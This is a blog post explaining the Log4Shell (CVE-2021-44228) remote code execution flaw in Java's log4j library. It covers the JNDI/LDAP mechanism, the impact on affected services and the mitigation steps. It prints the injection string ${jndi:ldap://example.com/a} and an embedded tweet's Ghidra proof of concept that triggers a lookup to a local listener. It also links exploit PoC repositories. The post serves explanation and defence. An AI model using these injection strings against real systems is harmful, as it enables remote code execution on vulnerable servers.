---
layout: post
title: "Entry 2"
date: 2021-12-10
permalink: /logs/entry-2
---
Yesterday, a high severity vulnerability{% sidenote 1 "[CVE-2021-44228](https://wiki2.org/en/Log4j){:target='_blank'}{:rel='noopener noreferrer'}" %} was discovered in the popular Java logging library log4j{% sidenote 2 "[Apache Log4j](https://wiki2.org/en/Log4j){:target='_blank'}{:rel='noopener noreferrer'}" %} that could lead to remote code execution (RCE).

{% newthought 'A few notes' %} about vulnerability
The log4j package uses JNDI{% sidenote 3 "[Java Naming and Directory Interface](https://wiki2.org/en/Java_Naming_and_Directory_Interface){:target='_blank'}{:rel='noopener noreferrer'}" %}. It is a standard API for directory service that allows a Java program to find data (in the form of a Java object) through a directory.

A Java program can use JNDI and LDAP together to find a Java object containing data that it might need. For example, in the standard Java documentation there’s an [example](https://docs.oracle.com/javase/jndi/tutorial/getStarted/examples/directory.html){:target='_blank'}{:rel='noopener noreferrer'} that talks to an LDAP server to retrieve attributes from an object. It uses the URL `ldap://localhost:389/o=JNDITutorial` to find the JNDITutorial object from an LDAP server running on the same machine (localhost) on port 389 and goes on to read attributes from it.

As the tutorial says _“If your LDAP server is located on another machine or is using another port, then you need to edit the LDAP URL”_. Thus the LDAP server could be running on a different machine and potentially anywhere on the Internet. That flexibility means that if an attacker could control the LDAP URL they’d be able to cause a Java program to load an object from a server under their control.

But in the case of log4j an attacker can control the LDAP URL by causing log4j to try to write a string like ${jndi:ldap://example.com/a}. If that happens then log4j will connect to the LDAP server at example.com and retrieve the object.

This happens because log4j contains [special syntax](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution){:target='_blank'}{:rel='noopener noreferrer'} in the form ${prefix:name} where prefix is one of a number of different [Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html){:target='_blank'}{:rel='noopener noreferrer'} where name should be evaluated. For example, ${java:version} is the current running version of Java.

{% newthought 'Impact' %}
Many services are vulnerable to this exploit. Cloud services like Steam, Apple iCloud, and apps like Minecraft have already been found to be vulnerable.

Ghidra's vulnerable too:

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Ghidra&#39;s vulnerable to log4j:<br>__attribute__((__section__(&quot;.note.${jndi:ldap://127.0.0.1:1234/abc}&quot;)))<br>int a = 1;<br>int main(){}<br>$ gcc hello.c<br>$ nc -l 1234<br>Load into Ghidra; it connects to 127.0.0.1:1234.<br>Ghidra 10.0.2, macOS OpenJDK Corretto 11.0.4.11.1<a href="https://t.co/Qu1psCjtY6">https://t.co/Qu1psCjtY6</a></p>&mdash; Zhuowei Zhang (@zhuowei) <a href="https://twitter.com/zhuowei/status/1469186818549719042?ref_src=twsrc%5Etfw">December 10, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

The underlying truth behind all of this is:

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">The lesson of Java is that some of the best engineers at the time created a secure byte-code VM and JIT, only for Design-By-Committee to come in and say &quot;maybe someone would want the Logger to load remote code via JNDI and LDAP. Let&#39;s add that!&quot;.</p>&mdash; postmodern (@postmodern_mod3) <a href="https://twitter.com/postmodern_mod3/status/1469401307005939712?ref_src=twsrc%5Etfw">December 10, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

{% newthought 'Mitigation' %}

1. Upgrading to [new version](https://logging.apache.org/log4j/2.x/download.html){:target='_blank'}{:rel='noopener noreferrer'}.
2. If you can't upgrade, set the property:

{% highlight bash %}
log4j2.formatMsgNoLookups=true
{% endhighlight %}

3. If none of the above works, you can remove the `JndiLookup` class from the classpath:
{% highlight bash %}
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
{% endhighlight %}
This command will remove the class from the log4j-core.

{% newthought 'Keypoints' %}

And the gist of it comes down to:

{% maincolumn 'https://imgs.xkcd.com/comics/dependency.png' '<em>Dependency</em>', from [xkcd](https://xkcd.com/2347/){:target="_blank"}{:rel="noopener noreferrer"} %}

----

{% newthought 'Further Information' %}

- [0] [https://www.lunasec.io/docs/blog/log4j-zero-day/](https://www.lunasec.io/docs/blog/log4j-zero-day/){:target='_blank'}{:rel='noopener noreferrer'}
- [1] [https://news.ycombinator.com/item?id=29504755](https://news.ycombinator.com/item?id=29504755){:target='_blank'}{:rel='noopener noreferrer'}
- [2] [https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US](https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US){:target='_blank'}{:rel='noopener noreferrer'}
- [3] [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/){:target='_blank'}{:rel='noopener noreferrer'}
- [4] [https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/](https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/){:target='_blank'}{:rel='noopener noreferrer'}
- [5] [https://github.com/tangxiaofeng7/apache-log4j-poc](https://github.com/tangxiaofeng7/apache-log4j-poc){:target='_blank'}{:rel='noopener noreferrer'}
- [6] [https://github.com/YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface){:target='_blank'}{:rel='noopener noreferrer'}
- [7] [https://www.veracode.com/blog/research/exploiting-jndi-injections-java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java){:target='_blank'}{:rel='noopener noreferrer'}




 